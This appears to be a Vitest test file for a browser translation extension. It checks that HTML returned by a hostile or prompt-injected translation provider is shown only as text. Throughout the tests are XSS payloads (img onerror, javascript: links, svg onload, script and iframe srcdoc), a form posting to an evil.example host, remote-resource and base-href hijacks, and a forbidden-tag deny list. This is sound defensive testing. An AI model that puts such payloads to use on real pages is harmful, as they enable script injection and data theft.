// @vitest-environment jsdom
// The wrapper fallback of translationOnly mode renders a provider's HTML
// translation when it cannot be paired with the site's own nodes. That string
// is untrusted: a hostile or prompt-injected provider can return markup that the
// site never contained, and writing it into the live page would run it there.
// The fallback therefore shows the translation's TEXT only (fail closed).
//
// Everything below the provider mock is production code: request preparation,
// the legacy/protected restore helpers, the in-place swap planner and the
// wrapper fallback all run for real in a DOM.

import { beforeEach, describe, expect, it, vi } from "vitest"
import { DEFAULT_CONFIG as EMPTY_CONFIG } from "@/utils/constants/config"
import { CONTENT_WRAPPER_CLASS, TRANSLATION_ONLY_ATTRIBUTE } from "@/utils/constants/dom-labels"
import { flushBatchedOperations } from "../../../dom/batch-dom"
import { removeAllTranslatedWrapperNodes } from "../../dom/translation-cleanup"
import { translateNodeTranslationOnlyMode } from "../translation-modes"

const { mockShouldFilterSmallParagraph, mockTranslateTextForPage, mockShouldSkipAsTargetLanguage } =
  vi.hoisted(() => ({
    mockShouldFilterSmallParagraph: vi.fn<(...args: any[]) => any>(),
    mockTranslateTextForPage: vi.fn<(...args: any[]) => any>(),
    mockShouldSkipAsTargetLanguage: vi.fn<(...args: any[]) => any>(),
  }))

vi.mock("@/utils/host/translate/filter-small-paragraph", () => ({
  shouldFilterSmallParagraph: mockShouldFilterSmallParagraph,
}))

vi.mock("@/utils/host/translate/translate-variants", () => ({
  translateTextForPage: mockTranslateTextForPage,
}))

vi.mock("@/utils/host/translate/target-language-skip", () => ({
  shouldSkipAsTargetLanguage: mockShouldSkipAsTargetLanguage,
}))

// A fresh provider per test: the DeepLX attribute-marker probe is module state
// keyed on the provider, and a test that breaks the markers must not flip the
// answer for the next one.
let providerSeq = 0
function makeConfig() {
  const id = `test-deeplx-${++providerSeq}`
  return {
    ...EMPTY_CONFIG,
    providersConfig: [
      {
        id,
        provider: "deeplx" as const,
        enabled: true,
        name: "Test DeepLX",
        baseURL: `https://example.com/translate/${providerSeq}`,
      },
    ],
    pageTranslation: { ...EMPTY_CONFIG.pageTranslation, providerId: id },
  }
}

const PROBE_KEY = "ltSecurityProbe"
const PROBE = `document.documentElement.dataset.${PROBE_KEY}='1'`

// The Pro-review fixture: no protected attributes, so the legacy request is used.
const PRO_SOURCE = "<b>Hello world</b> and <i>Welcome to this example</i>"
const ZH_BOLD = "你好世界"
const ZH_ITALIC = "欢迎来到这个示例"
const ZH_MATCHING = `<b>${ZH_BOLD}</b> 和 <i>${ZH_ITALIC}</i>`
const ZH_VISIBLE = `${ZH_BOLD} 和 ${ZH_ITALIC}`

function getWrappers(root: ParentNode = document): HTMLElement[] {
  return [...root.querySelectorAll<HTMLElement>(`.${CONTENT_WRAPPER_CLASS}`)]
}

function mountParagraph(html: string = PRO_SOURCE) {
  const p = document.createElement("p")
  p.innerHTML = html
  document.body.append(p)
  return { p, originalHTML: p.innerHTML, originalNodes: [...p.childNodes] }
}

async function runTranslationOnly(
  p: HTMLElement,
  config = makeConfig(),
  walkId = "walk-1",
): Promise<void> {
  await translateNodeTranslationOnlyMode([p], walkId, config)
  flushBatchedOperations()
}

const FORBIDDEN_TAGS = [
  "script",
  "style",
  "link",
  "img",
  "picture",
  "source",
  "track",
  "iframe",
  "frame",
  "frameset",
  "object",
  "embed",
  "applet",
  "form",
  "input",
  "button",
  "textarea",
  "select",
  "svg",
  "math",
  "video",
  "audio",
  "canvas",
  "portal",
  "meta",
  "base",
].join(",")

/**
 * Nothing an attacker could have written may be live in `root`: no element of
 * an active or resource-loading type, no event-handler attributes, no
 * script-bearing or remote URLs. The fixtures themselves contain none.
 */
function expectNoActiveContent(root: ParentNode): void {
  expect([...root.querySelectorAll(FORBIDDEN_TAGS)].map((el) => el.localName)).toEqual([])
  for (const element of root.querySelectorAll("*")) {
    for (const attribute of element.attributes) {
      expect(`${element.localName}[${attribute.name}]`).not.toMatch(/\[on/i)
      expect(attribute.value).not.toMatch(/^\s*(?:javascript|vbscript):/i)
      expect(attribute.value).not.toContain("evil.example")
      expect(attribute.value).not.toContain(PROBE_KEY)
    }
  }
}

/**
 * Let everything an injected payload could have queued actually run before the caller looks.
 * jsdom evaluates a clicked `javascript:` link two `setImmediate` hops after the click (follow the
 * hyperlink, then navigate), and Node does not order a `setTimeout(0)` against the second hop: on a
 * busy machine the timer fires first and the evaluation lands in whatever test runs next. That set the
 * probe during the test after the harness control, and would let a live `javascript:` payload pass
 * unseen. Alternating immediate and timer turns drains the chain whichever of the two goes first.
 */
async function settleQueuedWork(): Promise<void> {
  for (let turn = 0; turn < 3; turn++) {
    await new Promise<void>((resolve) => setImmediate(resolve))
    await new Promise<void>((resolve) => setTimeout(resolve, 0))
  }
}

/** Trigger what injected markup would trigger in a browser, then settle what it queued. */
async function fireInjectedTriggers(root: ParentNode): Promise<void> {
  for (const element of root.querySelectorAll("*")) {
    for (const type of ["error", "load", "toggle", "focus", "mouseover"]) {
      element.dispatchEvent(new Event(type))
    }
    if (element instanceof HTMLElement) element.click()
  }
  await settleQueuedWork()
}

function expectProbeUntouched(): void {
  expect(document.documentElement.dataset[PROBE_KEY]).toBeUndefined()
}

/**
 * Fire every trigger first, so a live payload shows up as an executed probe,
 * then check the structure.
 */
async function expectInertPage(): Promise<void> {
  await fireInjectedTriggers(document.body)
  expectProbeUntouched()
  expectNoActiveContent(document.body)
}

/** The wrapper fallback shows plain text: one text node, no elements. */
function expectTextOnlyWrapper(wrapper: HTMLElement, expectedText: string): void {
  expect(wrapper.children.length).toBe(0)
  expect(wrapper.childNodes.length).toBe(1)
  expect(wrapper.firstChild?.nodeType).toBe(Node.TEXT_NODE)
  expect(wrapper.textContent).toBe(expectedText)
}

describe("translationOnly wrapper fallback fails closed on provider HTML", () => {
  beforeEach(() => {
    document.body.replaceChildren()
    delete document.documentElement.dataset[PROBE_KEY]
    mockShouldFilterSmallParagraph.mockReset().mockResolvedValue(false)
    mockShouldSkipAsTargetLanguage.mockReset().mockResolvedValue(false)
    mockTranslateTextForPage.mockReset().mockResolvedValue(ZH_MATCHING)
  })

  describe("harness control", () => {
    it("executes inline handlers, so a clean probe afterwards is meaningful", async () => {
      const armed = document.createElement("div")
      armed.innerHTML = [
        `<img src="data:," onerror="${PROBE}">`,
        `<a href="javascript:${PROBE}">go</a>`,
      ].join("")
      document.body.append(armed)

      await fireInjectedTriggers(armed)

      expect(document.documentElement.dataset[PROBE_KEY]).toBe("1")
      delete document.documentElement.dataset[PROBE_KEY]
      armed.remove()
    })
  })

  describe("alignment failure never writes provider markup into the page", () => {
    it("Pro-review repro: an <img onerror> appended to a structurally matching translation", async () => {
      const injection = `<img src="data:," onerror="${PROBE}">`
      mockTranslateTextForPage.mockResolvedValue(`${ZH_MATCHING}${injection}`)
      const { p, originalNodes } = mountParagraph()

      await runTranslationOnly(p)

      // The route under test: an HTML request that went out on the legacy path.
      expect(mockTranslateTextForPage).toHaveBeenCalledTimes(1)
      expect(mockTranslateTextForPage.mock.calls[0]![0]).toBe(PRO_SOURCE)
      expect(mockTranslateTextForPage.mock.calls[0]![1]).toBe("html")

      await expectInertPage()

      // The translation is still shown, in a wrapper holding plain text only.
      const [wrapper] = getWrappers()
      expect(getWrappers()).toHaveLength(1)
      expectTextOnlyWrapper(wrapper!, ZH_VISIBLE)
      expect(p.textContent).toBe(ZH_VISIBLE)
      // …and the originals were displaced, not destroyed.
      expect(originalNodes.every((node) => !node.isConnected)).toBe(true)
    })

    it.each([
      ["iframe with a remote src", `<iframe src="https://evil.example/frame"></iframe>`],
      ["iframe srcdoc carrying a script", `<iframe srcdoc="<script>${PROBE}</script>"></iframe>`],
      ["svg onload", `<svg onload="${PROBE}"></svg>`],
      ["svg containing a script", `<svg><script>${PROBE}</script></svg>`],
      ["script element", `<script>${PROBE}</script>`],
      ["style @import of a remote sheet", `<style>@import url(https://evil.example/x.css)</style>`],
      ["link to a remote stylesheet", `<link rel="stylesheet" href="https://evil.example/x.css">`],
      [
        "form posting to a remote origin",
        `<form action="https://evil.example/collect" method="post"><input name="q"><button>go</button></form>`,
      ],
      ["img loading a new remote URL", `<img src="https://evil.example/pixel.gif">`],
      [
        "remote CSS background on a new span",
        `<span style="background-image:url(https://evil.example/b.png)">x</span>`,
      ],
      [
        "object and embed pointing at a remote origin",
        `<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x">`,
      ],
      ["meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example/">`],
      ["base href hijack", `<base href="https://evil.example/">`],
      ["an extra element carrying an on* attribute", `<b onclick="${PROBE}">extra</b>`],
      ["an on* attribute nested inside a matching tag", `<u onmouseover="${PROBE}">x</u>`],
    ])("legacy path: %s", async (_name, injection) => {
      // The nested case injects INSIDE the matching <b>, so the top level lines up
      // and only the deeper level fails to align.
      const output = injection.startsWith("<u ")
        ? `<b>${ZH_BOLD}${injection}</b> 和 <i>${ZH_ITALIC}</i>`
        : `${ZH_MATCHING}${injection}`
      mockTranslateTextForPage.mockResolvedValue(output)
      const { p } = mountParagraph()

      await runTranslationOnly(p)

      await expectInertPage()
      const wrappers = getWrappers()
      expect(wrappers).toHaveLength(1)
      expect(wrappers[0]!.children.length).toBe(0)
      expect(p.textContent).toContain(ZH_BOLD)
      expect(p.textContent).toContain(ZH_ITALIC)
      expect(p.textContent).not.toContain("Hello world")
    })

    it("legacy path: an <a href=javascript:> that no longer matches the source link", async () => {
      // The href differs from the source link's, which the planner treats as a
      // misalignment (identity attribute) rather than something to copy.
      mockTranslateTextForPage.mockResolvedValue(
        `<a href="javascript:${PROBE}">阅读文档</a> 和 <b>更多</b>`,
      )
      const { p } = mountParagraph(`<a href="/docs">Read the docs</a> and <b>more</b>`)

      await runTranslationOnly(p)

      await expectInertPage()
      expect(getWrappers()).toHaveLength(1)
      expect(p.textContent).toBe("阅读文档 和 更多")
      expectTextOnlyWrapper(getWrappers()[0]!, "阅读文档 和 更多")
    })

    it("protected-marker path: attribute stripping does not stop injected elements", async () => {
      // A link with a protected attribute puts the request on the marker path.
      // The provider echoes the markers faithfully and appends hostile elements;
      // `restore` strips attributes from unmarked elements but not the elements.
      const injected = [
        `<img src="data:," onerror="${PROBE}">`,
        `<style>@import url(https://evil.example/x.css)</style>`,
        `<script>${PROBE}</script>`,
        `<iframe srcdoc="x"></iframe>`,
      ].join("")
      mockTranslateTextForPage.mockImplementation(
        async (requestHtml: string) =>
          requestHtml
            .replace("Read the docs", "阅读文档")
            .replace(" and ", " 和 ")
            .replace("more", "更多") + injected,
      )
      const { p } = mountParagraph(`<a href="/docs" class="doc">Read the docs</a> and <b>more</b>`)

      await runTranslationOnly(p)

      // The marker request really was sent (otherwise this is the legacy path).
      expect(String(mockTranslateTextForPage.mock.calls[0]![0])).not.toBe(
        `<a href="/docs" class="doc">Read the docs</a> and <b>more</b>`,
      )
      await expectInertPage()
      const [wrapper] = getWrappers()
      expectTextOnlyWrapper(wrapper!, "阅读文档 和 更多")
    })

    it("shows markup-looking text as text, never re-parsed into elements", async () => {
      mockTranslateTextForPage.mockResolvedValue(
        `&lt;img src=x onerror=&quot;${PROBE}&quot;&gt; ${ZH_BOLD}`,
      )
      const { p } = mountParagraph()

      await runTranslationOnly(p)

      expectNoActiveContent(document.body)
      expect(getWrappers()).toHaveLength(1)
      expect(p.textContent).toBe(`<img src=x onerror="${PROBE}"> ${ZH_BOLD}`)
      expectTextOnlyWrapper(getWrappers()[0]!, `<img src=x onerror="${PROBE}"> ${ZH_BOLD}`)
    })

    it("keeps line structure readable and never shows script or style source as text", async () => {
      mockTranslateTextForPage.mockResolvedValue(
        `<b>${ZH_BOLD}</b><br><i>${ZH_ITALIC}</i><u>多余</u><script>${PROBE}</script><style>.x{color:red}</style>`,
      )
      const { p } = mountParagraph()

      await runTranslationOnly(p)

      expect(getWrappers()).toHaveLength(1)
      expect(p.textContent).toBe(`${ZH_BOLD}\n${ZH_ITALIC}多余`)
      expectTextOnlyWrapper(getWrappers()[0]!, `${ZH_BOLD}\n${ZH_ITALIC}多余`)
      expectNoActiveContent(document.body)
    })

    it("a translation that is only markup keeps the originals instead of an empty wrapper", async () => {
      mockTranslateTextForPage.mockResolvedValue(
        `<img src="data:," onerror="${PROBE}"><script>${PROBE}</script>`,
      )
      const { p, originalHTML, originalNodes } = mountParagraph()

      await runTranslationOnly(p)

      expect(getWrappers()).toHaveLength(0)
      expect(p.innerHTML).toBe(originalHTML)
      expect([...p.childNodes]).toEqual(originalNodes)
      await expectInertPage()
    })

    it("does not even parse the payload into a wrapper the host removed mid-flight", async () => {
      // A detached <img onerror> still loads in a browser, so the stale-wrapper
      // guard is not enough on its own: nothing hostile may be built on it.
      let resolveTranslation!: (value: string) => void
      mockTranslateTextForPage.mockReturnValue(
        new Promise<string>((resolve) => {
          resolveTranslation = resolve
        }),
      )
      const { p, originalHTML, originalNodes } = mountParagraph()

      const translation = translateNodeTranslationOnlyMode([p], "walk-1", makeConfig())
      await vi.waitFor(() => expect(mockTranslateTextForPage).toHaveBeenCalled())
      flushBatchedOperations()
      const wrapper = getWrappers()[0]!
      expect(wrapper.isConnected).toBe(true)

      removeAllTranslatedWrapperNodes(document)
      flushBatchedOperations()
      resolveTranslation(`${ZH_MATCHING}<img src="data:," onerror="${PROBE}">`)
      await translation
      flushBatchedOperations()

      // Stale-wrapper guard intact: the originals are the live content.
      expect(wrapper.isConnected).toBe(false)
      expect(getWrappers()).toHaveLength(0)
      expect(p.innerHTML).toBe(originalHTML)
      expect([...p.childNodes]).toEqual(originalNodes)
      // And the orphaned wrapper holds no elements.
      expect(wrapper.querySelector("*")).toBeNull()
      await fireInjectedTriggers(wrapper)
      expectProbeUntouched()
    })
  })

  describe("preserved behaviour", () => {
    it("in-place swap happy path is unchanged and ignores provider-supplied attributes", async () => {
      mockTranslateTextForPage.mockResolvedValue(
        `<b onclick="${PROBE}">${ZH_BOLD}</b> 和 <i onmouseover="${PROBE}">${ZH_ITALIC}</i>`,
      )
      const { p, originalNodes } = mountParagraph()
      const [bold, , italic] = originalNodes as [HTMLElement, Text, HTMLElement]

      await runTranslationOnly(p)

      expect(getWrappers()).toHaveLength(0)
      expect([...p.childNodes]).toEqual(originalNodes)
      expect(p.children[0]).toBe(bold)
      expect(p.children[1]).toBe(italic)
      expect(p.textContent).toBe(ZH_VISIBLE)
      expect(p.hasAttribute(TRANSLATION_ONLY_ATTRIBUTE)).toBe(true)
      // The site's own elements are untouched apart from their text.
      expect(bold.attributes).toHaveLength(0)
      expect(italic.attributes).toHaveLength(0)
      await fireInjectedTriggers(document.body)
      expectProbeUntouched()

      removeAllTranslatedWrapperNodes(document)
      flushBatchedOperations()
      expect(p.textContent).toBe("Hello world and Welcome to this example")
      expect(p.hasAttribute(TRANSLATION_ONLY_ATTRIBUTE)).toBe(false)
    })

    it("a marked element keeps its source attributes over the provider's", async () => {
      mockTranslateTextForPage.mockImplementation(async (requestHtml: string) =>
        requestHtml
          .replace("Read the docs", "阅读文档")
          .replace("<a ", `<a href="javascript:${PROBE}" onclick="${PROBE}" `),
      )
      const { p, originalNodes } = mountParagraph(
        `<a href="/docs" class="doc">Read the docs</a> and <b>more</b>`,
      )
      const link = originalNodes[0] as HTMLAnchorElement

      await runTranslationOnly(p)

      expect(getWrappers()).toHaveLength(0)
      expect(p.children[0]).toBe(link)
      expect(link.getAttribute("href")).toBe("/docs")
      expect(link.hasAttribute("onclick")).toBe(false)
      expect(link.textContent).toBe("阅读文档")
      await fireInjectedTriggers(document.body)
      expectProbeUntouched()
    })

    it("restore re-inserts the original node objects after a fallback (#1846)", async () => {
      mockTranslateTextForPage.mockResolvedValue(
        `${ZH_MATCHING}<img src="data:," onerror="${PROBE}">`,
      )
      const { p, originalHTML, originalNodes } = mountParagraph()
      const [bold, text, italic] = originalNodes as [HTMLElement, Text, HTMLElement]

      await runTranslationOnly(p)
      expect(getWrappers()).toHaveLength(1)
      expect(p.contains(bold)).toBe(false)

      removeAllTranslatedWrapperNodes(document)
      flushBatchedOperations()

      expect(getWrappers()).toHaveLength(0)
      expect(p.innerHTML).toBe(originalHTML)
      expect(p.childNodes[0]).toBe(bold)
      expect(p.childNodes[1]).toBe(text)
      expect(p.childNodes[2]).toBe(italic)
      expectNoActiveContent(document.body)
    })

    it("retranslate (non-toggle) restores the fallback and translates again", async () => {
      mockTranslateTextForPage.mockResolvedValueOnce(
        `${ZH_MATCHING}<img src="data:," onerror="${PROBE}">`,
      )
      const { p, originalNodes } = mountParagraph()
      const config = makeConfig()

      await translateNodeTranslationOnlyMode([p], "walk-1", config)
      flushBatchedOperations()
      expect(getWrappers()).toHaveLength(1)
      expect(p.textContent).toBe(ZH_VISIBLE)

      mockTranslateTextForPage.mockResolvedValueOnce(
        `<b>第二个</b> 和 <i>译文</i><iframe src="https://evil.example/f"></iframe>`,
      )
      await translateNodeTranslationOnlyMode([p], "walk-2", config, false)
      // The restore-then-retry hop is not awaited by the entry point.
      await vi.waitFor(() => {
        flushBatchedOperations()
        expect(mockTranslateTextForPage).toHaveBeenCalledTimes(2)
        expect(getWrappers()).toHaveLength(1)
        expect(getWrappers()[0]!.textContent).toBe("第二个 和 译文")
      })

      removeAllTranslatedWrapperNodes(document)
      flushBatchedOperations()
      expect([...p.childNodes]).toEqual(originalNodes)
    })

    it("toggle removes a fallback translation without a second provider call", async () => {
      mockTranslateTextForPage.mockResolvedValue(
        `${ZH_MATCHING}<img src="data:," onerror="${PROBE}">`,
      )
      const { p, originalNodes } = mountParagraph()
      const config = makeConfig()

      await translateNodeTranslationOnlyMode([p], "walk-1", config)
      flushBatchedOperations()
      expect(getWrappers()).toHaveLength(1)

      await translateNodeTranslationOnlyMode([p], "walk-2", config, true)
      flushBatchedOperations()

      expect(getWrappers()).toHaveLength(0)
      expect([...p.childNodes]).toEqual(originalNodes)
      expect(mockTranslateTextForPage).toHaveBeenCalledTimes(1)
    })

    it("empty translation still removes the wrapper and keeps the originals", async () => {
      mockTranslateTextForPage.mockResolvedValue("")
      const { p, originalHTML, originalNodes } = mountParagraph()

      await runTranslationOnly(p)

      expect(getWrappers()).toHaveLength(0)
      expect(p.innerHTML).toBe(originalHTML)
      expect([...p.childNodes]).toEqual(originalNodes)
    })

    it("a plain-text translation that cannot be paired renders exactly as before", async () => {
      mockTranslateTextForPage.mockResolvedValue("中文译文")
      const { p, originalNodes } = mountParagraph()

      await runTranslationOnly(p)

      const [wrapper] = getWrappers()
      expectTextOnlyWrapper(wrapper!, "中文译文")
      expect(p.textContent).toBe("中文译文")

      removeAllTranslatedWrapperNodes(document)
      flushBatchedOperations()
      expect([...p.childNodes]).toEqual(originalNodes)
    })

    it("drops a matching translation when the host mutated the run mid-flight", async () => {
      let resolveTranslation!: (value: string) => void
      mockTranslateTextForPage.mockReturnValue(
        new Promise<string>((resolve) => {
          resolveTranslation = resolve
        }),
      )
      const { p, originalNodes } = mountParagraph()
      const sourceText = originalNodes[1] as Text

      const translation = translateNodeTranslationOnlyMode([p], "walk-1", makeConfig())
      await vi.waitFor(() => expect(mockTranslateTextForPage).toHaveBeenCalled())
      sourceText.data = " host rewrote this "

      resolveTranslation(ZH_MATCHING)
      await translation
      flushBatchedOperations()

      expect(sourceText.data).toBe(" host rewrote this ")
      expect(getWrappers()).toHaveLength(0)
      expect(p.hasAttribute(TRANSLATION_ONLY_ATTRIBUTE)).toBe(false)
    })
  })
})
